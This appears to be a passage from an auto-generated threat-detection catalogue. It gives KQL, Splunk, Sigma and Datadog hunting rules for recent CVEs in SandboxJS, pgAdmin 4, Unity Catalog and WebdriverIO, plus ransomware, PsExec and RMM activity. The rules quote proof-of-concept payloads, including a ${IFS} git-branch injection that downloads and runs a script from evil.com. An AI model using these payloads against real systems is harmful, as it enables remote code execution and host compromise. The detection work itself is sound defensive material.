   or NewProcessName endswith "\pwsh.exe"

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem

[GHSA / CRITICAL] CVE-2026-43898: SandboxJS has a sandbox escape via Function.caller leakage of internal call op

GitHub Security Advisories
2026-05-11 2 use cases 1 technique 3 kill-chain phases detected

SandboxJS has a sandbox escape via Function.caller leakage of internal call op

CVEsCVE-2026-43898
ATT&CKT1190

Actions on Objectives
Likely
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Node.js spawning OS recon/shell binaries (post-exploit of SandboxJS escape CVE-2026-43898)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
[LLM] Node.js spawning OS recon/shell binaries (post-exploit of SandboxJS escape CVE-2026-43898) Exploitation High
Hunts node.exe (the host process embedding @nyariv/sandboxjs <= 0.9.5) spawning shell or built-in recon binaries — the visible footprint of a Function.caller→LispType.Call escape that lands a child_process.execSync('whoami') style RCE on the host. Node legitimately almost never spawns cmd/whoami/net/ipconfig/hostname/wmic/powershell, so a single hit on a SandboxJS-using service is high-fidelity. Rationale: The article's PoC ends in process.getBuiltinModule('child_process').execSync('whoami').toString() — the on-host artifact is a node.exe parent spawning whoami.exe (or any equivalent shell/recon LOLBin once the attacker pivots from the canary). Filters exclude legitimate npm/yarn/node-gyp/electron build flows that legitimately fork shells from node. CVE source: https://github.com/advisories/GHSA-g8f2-4f4f-5jqw. Cross-checked against: • https://github.com/advisories/GHSA-g8f2-4f4f-5jqw • https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/call.ts • https://nvd.nist.gov/vuln/detail/CVE-2026-43898
ATT&CKT1190 T1059.003 T1082 T1033

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → [LLM] pgAdmin 4 server-mode hosts vulnerable to CVE-2026-7813 (auth bypass + passexec_cmd RCE pre-9.15) · Asset exposure — vulnerability matches article CVE(s)

Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] pgAdmin 4 server process spawning shell/interpreter — passexec_cmd RCE (CVE-2026-7813)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
[LLM] pgAdmin 4 server-mode hosts vulnerable to CVE-2026-7813 (auth bypass + passexec_cmd RCE pre-9.15) Reconnaissance High
Inventories Windows/Linux endpoints running pgAdmin 4 builds below 9.15, which expose the Server Groups / Shared Servers / Background Process / Debugger authorization bypass and the writable passexec_cmd RCE described in GHSA-h2x2-q2mc-24gw. Prioritises internet-reachable server-mode deployments where authenticated-user object-ID guessing is exploitable. Rationale: Locks onto the exact fixed-version line in the advisory ("affects pgAdmin 4: before 9.15") plus the assigned CveId. The version-regex fallback catches hosts whose vendor TVM KB hasn't published the CVE yet but whose installed pgAdmin build is pre-9.15. Datadog/Falcon left blank — FDR and Datadog Cloud SIEM do not ship vulnerability-inventory data by default; this detection is intentionally an EDR/TVM pivot. Sigma omitted because vuln-inventory is not single-event-shape. Cross-checked against: • https://github.com/advisories/GHSA-h2x2-q2mc-24gw • https://www.cve.org/CVERecord?id=CVE-2026-7813 • https://www.postgresql.org/about/news/pgadmin-4-v915-released-3295/ • https://securityonline.info/pgadmin-4-critical-vulnerabilities-rce-authorization-bypass-v9-15/ • https://app.opencve.io/cve/CVE-2026-7813
ATT&CKT1190 T1068

// Combines CVE-tagged TVM hits with version-regex sweep for environments where the KB is lagging
let vuln_versions = @"^([0-8]\.|9\.([0-9]|1[0-4])(\.|$))"; // < 9.15

| project Timestamp, DeviceId, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| join kind=leftouter (DeviceInfo | where Timestamp > ago(7d) | summarize arg_max(Timestamp, IsInternetFacing, PublicIP, MachineGroup) by DeviceId) on DeviceId
| project Timestamp, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate, IsInternetFacing, PublicIP, MachineGroup
| order by IsInternetFacing desc, Timestamp desc

[LLM] pgAdmin 4 server process spawning shell/interpreter — passexec_cmd RCE (CVE-2026-7813) Exploitation High
Catches the privilege-escalation primitive from CVE-2026-7813: a non-owner who writes the Shared Server's passexec_cmd field causes pgAdmin to execute that shell command in the owner's process context the next time the connection is established. The signal is pgAdmin4.exe / the gunicorn|uwsgi|python interpreter hosting pgAdmin4.py spawning cmd / powershell / pwsh / bash / sh / wscript / cscript / mshta — a child shape pgAdmin's normal libpq workflow never produces. Rationale: Locks onto the exact privilege-escalation primitive named in GHSA-h2x2-q2mc-24gw: writable passexec_cmd is a shell command that pgAdmin invokes when establishing a connection, so when exploited it manifests as the pgAdmin process tree branching into a shell/interpreter — a child shape pgAdmin's normal libpq / pg_dump / pg_restore flow never produces. The pg_dump/pg_restore/psql exclusion preserves precision for the backup-wizard FP path. Cross-checked against SecurityOnline (https://securityonline.info/pgadmin-4-critical-vulnerabilities-rce-authorization-bypass-v9-15/) and the upstream PostgreSQL 9.15 release note confirming this is the writable-field RCE chain (not a separate code-injection bug). Cross-checked against: • https://github.com/advisories/GHSA-h2x2-q2mc-24gw • https://www.cve.org/CVERecord?id=CVE-2026-7813 • https://www.postgresql.org/about/news/pgadmin-4-v915-released-3295/ • https://securityonline.info/pgadmin-4-critical-vulnerabilities-rce-authorization-bypass-v9-15/ • https://www.thehackerwire.com/pgadmin-4-critical-authorization-bypass-and-rce/
ATT&CKT1059.001 T1059.003 T1059.004 T1068 T1190

         and InitiatingProcessCommandLine has_any ("pgAdmin4.py","pgadmin4","pgadmin"))
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","bash","sh","dash","zsh","ksh","bash.exe","sh.exe")
     or FolderPath matches regex @"(?i)/(usr/)?(local/)?bin/(bash|sh|dash|zsh|ksh)$"

[LLM] Unity Catalog CVE-2026-27478: token-exchange POST with id_token subject (JWT iss bypass) Exploitation High
Hunts the specific HTTP request shape that triggers the Unity Catalog JWT issuer bypass: a POST to the vulnerable /api/1.0/unity-control/auth/tokens endpoint carrying grant_type=token-exchange and subject_token_type=id_token. Article-specific because the path + grant_type pair is unique to this CVE and not legitimately exercised by normal Databricks/UC clients in most deployments. Rationale: Pivots on the literal vulnerable path `/api/1.0/unity-control/auth/tokens` and the OAuth2 token-exchange + id_token strings from the PoC (article body). The combination of POST + this exact path is high-fidelity because Unity Catalog clients use the higher-level Databricks SDK token flow, not direct curl-style token-exchange calls against this endpoint. Cross-checked against the Unity Catalog server source on GitHub and the GHSA-qqcj-rghw-829x advisory. Cross-checked against: • https://github.com/advisories/GHSA-qqcj-rghw-829x • https://nvd.nist.gov/vuln/detail/CVE-2026-27478 • https://github.com/unitycatalog/unitycatalog
ATT&CKT1190 T1078.004 T1550.001
Data sourcesWeb.Web
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteUrl has "/api/1.0/unity-control/auth/tokens" or AdditionalFields has "/api/1.0/unity-control/auth/tokens"
| where Protocol in~ ("Tcp","Http","Https")
| project Timestamp, DeviceName, DeviceId, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessAccountName, AdditionalFields
| order by Timestamp desc
// Detect the article-specific Unity Catalog token-exchange request to the vulnerable endpoint.
// Look at any of: WAF/proxy (CommonSecurityLog), IIS/reverse-proxy (W3CIISLog), or Syslog where the UC server logs HTTP requests.
let endpoint = @"/api/1.0/unity-control/auth/tokens";
(union isfuzzy=true
  (CommonSecurityLog
    | where TimeGenerated > ago(7d)
    | where RequestURL has endpoint or Message has endpoint
    | where RequestMethod =~ "POST" or Message has "token-exchange"
    | extend SrcHost = coalesce(SourceHostName, DeviceCustomString1), Computer = coalesce(DestinationHostName, DeviceExternalID)
    | project TimeGenerated, Computer, SrcHost, SourceIP, DestinationIP, DestinationPort, RequestMethod, RequestURL, RequestClientApplication, Message, DeviceVendor, DeviceProduct, _ResourceId),
  (W3CIISLog
    | where TimeGenerated > ago(7d)
    | where csUriStem has endpoint
    | where csMethod =~ "POST"
    | extend Message = strcat(csUriStem, "?", csUriQuery)
    | project TimeGenerated, Computer, SrcHost = tostring(cIP), SourceIP = cIP, DestinationIP = "", DestinationPort = sPort, RequestMethod = csMethod, RequestURL = strcat(csUriStem,"?",csUriQuery), RequestClientApplication = csUserAgent, Message, DeviceVendor = "Microsoft", DeviceProduct = "IIS", _ResourceId),
  (Syslog
    | where TimeGenerated > ago(7d)
    | where SyslogMessage has endpoint and (SyslogMessage has "token-exchange" or SyslogMessage has "subject_token_type" or SyslogMessage has "id_token")
    | project TimeGenerated, Computer, SrcHost = HostName, SourceIP = HostIP, DestinationIP = "", DestinationPort = "", RequestMethod = "POST", RequestURL = endpoint, RequestClientApplication = ProcessName, Message = SyslogMessage, DeviceVendor = "Linux", DeviceProduct = Facility, _ResourceId))
| where Message has_any ("urn:ietf:params:oauth:grant-type:token-exchange","token-exchange","subject_token_type","id_token")
   or RequestURL has_any ("grant_type=urn","token-exchange","subject_token_type","id_token")
| order by TimeGenerated desc

description: Detects POST requests to the vulnerable Unity Catalog token-exchange endpoint with the OAuth2 token-exchange grant type and an id_token subject token type, the precise shape required to exploit CVE-2026-27478.

[LLM] Unity Catalog impersonation: token-exchange POST followed by catalog enumeration Actions on Objectives High
Article-specific temporal correlation: the PoC mints an impersonation token at /api/1.0/unity-control/auth/tokens and immediately calls /api/2.1/unity-catalog/catalogs to enumerate access. A single source IP performing both calls within ~5 minutes — especially when the source is not a known Databricks workspace egress range — is a high-confidence post-exploitation signal for CVE-2026-27478. Rationale: Pivots on the two literal API paths from the article body — the vulnerable token-exchange endpoint `/api/1.0/unity-control/auth/tokens` and the post-impersonation enumeration target `/api/2.1/unity-catalog/catalogs` (PoC `requests.get(...)` block). The 5-minute temporal correlation from the same source IP is the high-fidelity differentiator: legitimate SDK flows do not chain these two endpoints back-to-back from the same external IP. Schema fix re-uses `Computer` on CommonSecurityLog/Syslog/W3CIISLog instead of `DeviceName`. Cross-checked against: • https://github.com/advisories/GHSA-qqcj-rghw-829x • https://nvd.nist.gov/vuln/detail/CVE-2026-27478 • https://docs.unitycatalog.io/usage/access_control/
ATT&CKT1550.001 T1087.004 T1213.003 T1530
Data sourcesWeb.Web

let window = 5m;

            InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName;

  | where Timestamp > ago(lookback)
  | where RemoteUrl has_any ("/api/2.1/unity-catalog/catalogs","/api/2.1/unity-catalog/schemas","/api/2.1/unity-catalog/tables","/api/2.1/unity-catalog/volumes")
  | project EnumTime = Timestamp, DeviceName, AttackerIP = RemoteIP, EnumUrl = RemoteUrl;
TokenMint

          DeviceName, AttackerIP, MintUrl, EnumUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by MintTime desc

let Enum = (union isfuzzy=true
  (CommonSecurityLog
    | where TimeGenerated > ago(lookback)
    | where RequestURL has_any (enum_paths) or Message has_any (enum_paths)
    | extend SrvHost = coalesce(DestinationHostName, DeviceExternalID, tostring(_ResourceId))
    | project EnumTime = TimeGenerated, SrvHost, AttackerIP = SourceIP, EnumUrl = RequestURL),
  (W3CIISLog
    | where TimeGenerated > ago(lookback)
    | where csUriStem has_any (enum_paths)
    | project EnumTime = TimeGenerated, SrvHost = Computer, AttackerIP = cIP, EnumUrl = csUriStem),
  (Syslog
    | where TimeGenerated > ago(lookback)
    | where SyslogMessage has_any (enum_paths)
    | project EnumTime = TimeGenerated, SrvHost = Computer, AttackerIP = HostIP, EnumUrl = "unity-catalog enumeration"));
Mint
| join kind=inner (Enum) on SrvHost, AttackerIP
| where EnumTime between (MintTime .. MintTime + window)
| extend DelaySec = datetime_diff('second', EnumTime, MintTime)
| project MintTime, EnumTime, DelaySec, SrvHost, AttackerIP, MintUrl, MintUA, EnumUrl
| summarize EnumCount = count(), FirstEnum = min(EnumTime), LastEnum = max(EnumTime), EnumPaths = make_set(EnumUrl,10) by MintTime, SrvHost, AttackerIP, MintUA
| where EnumCount >= 1

[LLM] Vulnerable @wdio/browserstack-service Package Installed (CVE-2026-25244) Reconnaissance High
Hunting query that surfaces dev workstations and CI/CD hosts with the WebdriverIO BrowserStack Service package at vulnerable versions (<=9.23.2). Pre-patch posture hunt — exposure to the git-branch command-injection RCE path described in CVE-2026-25244. Rationale: Anchors on the exact affected package name `@wdio/browserstack-service` and the fixed-version cutoff `<=9.23.2` published in the GHSA-5c46-x3qw-q7j7 advisory. Inventory hunt produces a definitive, low-FP target list for patch action before any active exploitation is needed. Cross-checked against: • https://github.com/advisories/GHSA-5c46-x3qw-q7j7 • https://github.com/webdriverio/webdriverio/blob/ea0e3e00288abced4c739ff9e46c46977b7cdbd2/packages/wdio-browserstack-service/src/testorchestration/helpers.ts
ATT&CKT1195.002 T1059.004
Data sourcesVulnerabilities Endpoint.Filesystem
// Defender TVM inventory hunt — surfaces hosts running @wdio/browserstack-service at vulnerable build (<=9.23.2)
DeviceTvmSoftwareInventory
| where SoftwareName has "browserstack-service" or SoftwareName has "@wdio/browserstack-service" or SoftwareName has "wdio-browserstack-service"
| extend VerParts = split(SoftwareVersion, ".")
| extend Major = toint(VerParts[0]), Minor = toint(VerParts[1]), Patch = toint(VerParts[2])
| where Major < 9 or (Major == 9 and Minor < 23) or (Major == 9 and Minor == 23 and Patch <= 2)
| join kind=leftouter (
    DeviceTvmSoftwareVulnerabilities
    | where CveId == "CVE-2026-25244"
    | project DeviceId, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
  ) on DeviceId
| project DeviceName, DeviceId, OSPlatform, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by DeviceName asc
// Sentinel TVM inventory hunt for vulnerable @wdio/browserstack-service
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId == "CVE-2026-25244" or (SoftwareName has "browserstack-service" and SoftwareVendor has_any ("webdriverio","wdio"))
| extend VerParts = split(SoftwareVersion, ".")
| extend Major = toint(VerParts[0]), Minor = toint(VerParts[1]), Patch = toint(VerParts[2])
| where Major < 9 or (Major == 9 and Minor < 23) or (Major == 9 and Minor == 23 and Patch <= 2)
| project TimeGenerated, DeviceName, OSPlatform, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by DeviceName asc

[LLM] Node/WDIO Spawning Shell With Bash ${IFS} Injection (CVE-2026-25244 exploitation) Exploitation High
Alerts when a Node.js / npm / npx process spawns a Unix shell whose command line contains the `${IFS}` bash variable substitution token — the exact whitespace-bypass technique used in the CVE-2026-25244 PoC where git branch names are interpolated unsanitised into execSync. Pairs the WDIO/Node parent with the injection signature to keep FP near zero. Rationale: Anchors on the literal `${IFS}` bash whitespace-bypass token from the article's three PoC payloads (`;touch${IFS}/tmp/pwned.txt`, `;rm${IFS}/tmp/pwned.txt`, `;curl${IFS}evil.com/evil.sh${IFS}>/tmp/evil.sh;bash${IFS}/tmp/evil.sh`). Pairing with a Node/WDIO parent process eliminates virtually all legitimate occurrences — `${IFS}` rarely appears in benign command lines outside of shell tutorials. Cross-checked against: • https://github.com/advisories/GHSA-5c46-x3qw-q7j7 • https://github.com/webdriverio/webdriverio/blob/ea0e3e00288abced4c739ff9e46c46977b7cdbd2/packages/wdio-browserstack-service/src/testorchestration/helpers.ts
ATT&CKT1059.004 T1190 T1203
Data sourcesEndpoint.Processes
// Catch the exact PoC pattern from CVE-2026-25244: node-spawned shell with ${IFS} whitespace bypass
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node","node.exe","npm","npx","wdio","yarn","pnpm")
   or InitiatingProcessCommandLine has_any ("@wdio/cli","wdio.conf","@wdio/browserstack-service")
| where FileName in~ ("sh","bash","dash","zsh","ash","/bin/sh","/bin/bash")
| where ProcessCommandLine has "${IFS}"
   or ProcessCommandLine has_any (";curl${IFS}",";bash${IFS}",";rm${IFS}",";touch${IFS}",";wget${IFS}")
   or ProcessCommandLine matches regex @"git\s+(checkout|branch|rev-parse|for-each-ref|symbolic-ref)[^\n]*[;|`$]\s*\$\{IFS\}"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          ParentFile = InitiatingProcessFileName,
          ParentCmd  = InitiatingProcessCommandLine,
          ParentFolder = InitiatingProcessFolderPath,
          GrandParent = InitiatingProcessParentFileName
| order by Timestamp desc
// ASIM ImProcessCreate — works across Linux MDE, auditd, Sysmon for Linux connectors
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("node","npm","npx","wdio","yarn","pnpm")
   or ParentProcessCommandLine has_any ("@wdio/cli","wdio.conf","@wdio/browserstack-service")
| where TargetProcessName has_any ("/sh","/bash","/dash","/zsh","/ash")
   or TargetProcessName in~ ("sh","bash","dash","zsh","ash")
| where TargetProcessCommandLine has "${IFS}"
   or TargetProcessCommandLine has_any (";curl${IFS}",";bash${IFS}",";rm${IFS}",";touch${IFS}",";wget${IFS}")
   or TargetProcessCommandLine matches regex @"git\s+(checkout|branch|rev-parse|for-each-ref|symbolic-ref)[^\n]*[;|`$]\s*\$\{IFS\}"
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName,
          TargetProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc
title: WebdriverIO BrowserStack Service Command Injection via Git Branch Name (CVE-2026-25244)
id: 8c5d2f4a-9b3e-4d7c-a1e6-7f2b5c8a4d91
status: experimental
description: Detects exploitation of CVE-2026-25244 — a command injection in @wdio/browserstack-service where attacker-controlled git branch names are interpolated unsanitised into execSync. The PoC uses the bash ${IFS} variable to bypass whitespace filtering, producing a shell command line that contains the literal ${IFS} token plus chained operators (;) — extremely rare in legitimate command lines.
references:
    - https://github.com/advisories/GHSA-5c46-x3qw-q7j7
    - https://github.com/webdriverio/webdriverio/blob/ea0e3e00288abced4c739ff9e46c46977b7cdbd2/packages/wdio-browserstack-service/src/testorchestration/helpers.ts
author: SOC Detection Engineering
date: 2026/05/12
tags:
    - attack.execution
    - attack.t1059.004
    - attack.initial-access
    - attack.t1190
    - cve.2026.25244
logsource:
    category: process_creation
    product: linux
detection:
    parent_selection:
        ParentImage|contains:
            - '/node'
            - '/npm'
            - '/npx'
            - '/wdio'
            - '/yarn'
            - '/pnpm'
    shell_selection:
        Image|endswith:
            - '/sh'
            - '/bash'
            - '/dash'
            - '/zsh'
            - '/ash'
    injection_selection:
        CommandLine|contains:
            - '${IFS}'
            - ';curl${IFS}'
            - ';bash${IFS}'
            - ';rm${IFS}'
            - ';touch${IFS}'
            - ';wget${IFS}'
    condition: parent_selection and shell_selection and injection_selection
falsepositives:
    - Legitimate use of ${IFS} in developer shell scripts (rare in CI/CD contexts)
level: high
(source:linux.auditd OR source:linux.syslog OR source:windows.sysmon) (@process.parent.name:(node OR npm OR npx OR wdio OR yarn OR pnpm) OR @ParentImage:(*\node OR *\node.exe OR *\npm* OR *\npx* OR *\wdio*)) AND (@process.name:(sh OR bash OR dash OR zsh OR ash) OR @Image:(*\sh OR *\bash OR *\dash OR *\zsh OR *\ash)) AND (@process.command_line:(*"${IFS}"* OR *";curl${IFS}"* OR *";bash${IFS}"* OR *";rm${IFS}"* OR *";touch${IFS}"*) OR @CommandLine:(*"${IFS}"* OR *";curl${IFS}"* OR *";bash${IFS}"* OR *";rm${IFS}"* OR *";touch${IFS}"*))
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as process values(Processes.parent_process) as parent_process from datamodel=Endpoint.Processes where (Processes.parent_process_name IN ("node","node.exe","npm","npm-cli.js","npx","wdio","yarn","pnpm") OR Processes.parent_process IN ("*node*","*npm*","*npx*","*wdio*")) AND Processes.process_name IN ("sh","bash","dash","zsh","ash") AND (Processes.process="*${IFS}*" OR Processes.process="*git*checkout*;*" OR Processes.process="*;curl${IFS}*" OR Processes.process="*;bash${IFS}*" OR Processes.process="*;rm${IFS}*" OR Processes.process="*;touch${IFS}*") by host Processes.user Processes.process_name Processes.parent_process_name Processes.process Processes.parent_process | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as process values(Processes.parent_process) as parent_process from datamodel=Endpoint.Processes where (Processes.parent_process_name IN ("node","node.exe","npm","npm-cli.js","npx","wdio","yarn","pnpm") OR Processes.parent_process IN ("*node*","*npm*","*npx*","*wdio*")) AND Processes.process_name IN ("sh","bash","dash","zsh","ash") AND (Processes.process="*${IFS}*" OR Processes.process="*git*checkout*;*" OR Processes.process="*;curl${IFS}*" OR Processes.process="*;bash${IFS}*" OR Processes.process="*;rm${IFS}*" OR Processes.process="*;touch${IFS}*") by host Processes.user Processes.process_name Processes.parent_process_name Processes.process Processes.parent_process | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-25244")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-25244")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

Remote service execution — PsExec / SMB lateral movement Actions on Objectives High
psexec / paexec / smbexec / wmic /node — service install over SMB from remote host.
ATT&CKT1021.002 T1569.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
   or (FileName =~ "wmic.exe" and ProcessCommandLine has "/node:")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc

SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688            // process-create (audit-policy required)
| where Account !endswith "$"
| where NewProcessName endswith "\psexec.exe"
   or NewProcessName endswith "\psexesvc.exe"
   or NewProcessName endswith "\paexec.exe"
   or (NewProcessName endswith "\wmic.exe" and CommandLine has "/node:")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: PsExec / SMB Lateral Movement Tooling Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d03
status: experimental
description: |
    PsExec, paexec, smbexec, csexec, remcom — admin-grade tooling that
    pivots over SMB. Pair with `wmic /node:` for the full cluster.
references:
    - https://attack.mitre.org/techniques/T1021/002/
    - https://attack.mitre.org/techniques/T1569/002/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1021.002
    - attack.t1569.002
    - attack.lateral-movement
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_psexec:
        Image|endswith:
            - '\psexec.exe'
            - '\psexec64.exe'
            - '\psexesvc.exe'
            - '\paexec.exe'
            - '\csexec.exe'
            - '\remcom.exe'
            - '\smbexec.py'
    selection_wmic_remote:
        Image|endswith:
            - '\wmic.exe'
        CommandLine|contains:
            - '/node:'
    condition: selection_psexec or selection_wmic_remote
falsepositives:
    - Sysadmins running approved remote-management tooling — wrap with
      a known-admin-host watchlist
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
       OR (Processes.process_name="wmic.exe" AND Processes.process="*/node:*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
       OR (Processes.process_name="wmic.exe" AND Processes.process="*/node:*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard Installation High
ConnectWise / AnyDesk / TeamViewer / ScreenConnect / Atera installed outside IT change windows = common tradecraft for ransomware affiliates and IT-helpdesk impersonators.
ATT&CKT1219
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("AnyDesk.exe","TeamViewer.exe","TeamViewer_Service.exe",
        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",
        "atera_agent.exe","SplashtopStreamer.exe","RustDesk.exe","NinjaOne.exe")
   or FileName matches regex @"(?i)kaseya.*\.exe"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where NewProcessName endswith "\AnyDesk.exe"
   or NewProcessName endswith "\TeamViewer.exe"
   or NewProcessName endswith "\TeamViewer_Service.exe"
   or NewProcessName endswith "\ScreenConnect.ClientService.exe"
   or NewProcessName endswith "\ConnectWiseControl.ClientService.exe"
   or NewProcessName endswith "\atera_agent.exe"
   or NewProcessName endswith "\SplashtopStreamer.exe"
   or NewProcessName endswith "\RustDesk.exe"
   or NewProcessName endswith "\NinjaOne.exe"
| project TimeGenerated, Computer, Account, NewProcessName,

| order by TimeGenerated desc

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
